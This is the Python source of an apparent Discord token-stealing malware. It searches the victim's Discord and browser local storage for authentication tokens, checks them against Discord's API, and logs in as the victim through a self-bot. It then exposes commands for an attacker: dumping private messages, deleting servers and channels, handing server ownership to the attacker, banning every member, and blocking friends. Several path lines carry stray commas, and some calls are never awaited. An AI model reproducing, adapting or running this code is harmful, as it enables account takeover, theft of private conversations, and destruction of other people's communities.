import discord
from discord.ext import commands
import asyncio
import re 
import os
import datetime
import threading
import requests

attackerid = "" #your id
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
tokens = []

def check_token(token):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
        "authorization": token
    }
    json = {
        "theme": ""
    }
    r2 = requests.patch('https://discord.com/api/v8/users/@me/settings', headers=headers, json=json)
    print("code: " + str(r2.status_code))
    if str(r2.status_code) == "401":
        return False
    else:
        return True 

def find_tokens(path):

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

prefix = "!!"
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True)

@bot.event
async def on_ready():
    print("Logged in as: " + bot.user.name)

@bot.command()
async def dmdump(ctx):
    for ch in bot.private_channels:
        messages = await ch.history(limit=200).flatten()
        for message in messages:
            with open("C:\\Users\\Public\\dms.txt", "a", encoding='utf-8-sig') as dmfile:
                to_write = str(message.channel) + "> " + str(message.content) + "\n"
                dmfile.write(to_write)
        ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))
@bot.command()
async def delete(ctx):
    try:
        await ctx.guild.delete()
    except:
        print("i dont have guild permission")
@bot.command()
async def owner(ctx):
    user = bot.fetch_user(attackerid) # your id
    try:
        await ctx.guild.edit(owner=user)
    except:
        print("cant")

@bot.command()
async def baneveryone(ctx):
    for member in ctx.guild.members:
        try:
            member.ban()
        except:
            print("could not ban: " + member.name)
            pass

@bot.command()
async def deletechannels(ctx):
    for c in ctx.guild.channels:
        try:
            await c.delete()
        except:
            print("cant delete channel")
            pass

@bot.command()
async def leaveallservers(ctx):
    for guild in bot.guilds:
        try:
            guild.leave()
        except:
            guild.delete()

@bot.command()
async def blockallfriends(ctx):
    for friend in bot.user.friends:
        friend.block()

path1 = roaming + '\\discord\\Local Storage\\leveldb'
path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
path3 = roaming + '\\discordptb\\Local Storage\\leveldb',
path4 = local + '\\Google\\Chrome\\User Data\\Default',
path5 = roaming + '\\Opera Software\\Opera Stable',
path6 = local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
path7 = local + '\\Yandex\\YandexBrowser\\User Data\\Default'

if os.path.isdir(str(path1)):
    find_tokens(str(path1))
if os.path.isdir(str(path2)):
    find_tokens(str(path2))
if os.path.isdir(str(path3)):
    find_tokens(str(path3))
if os.path.isdir(str(path4)):
    find_tokens(str(path4))
if os.path.isdir(str(path5)):
    find_tokens(str(path5))
if os.path.isdir(str(path6)):
    find_tokens(str(path6))
if os.path.isdir(str(path7)):
    find_tokens(str(path7))

for token in tokens:
    if check_token(token):
        bot.run(token, bot=False)
    else:
        pass
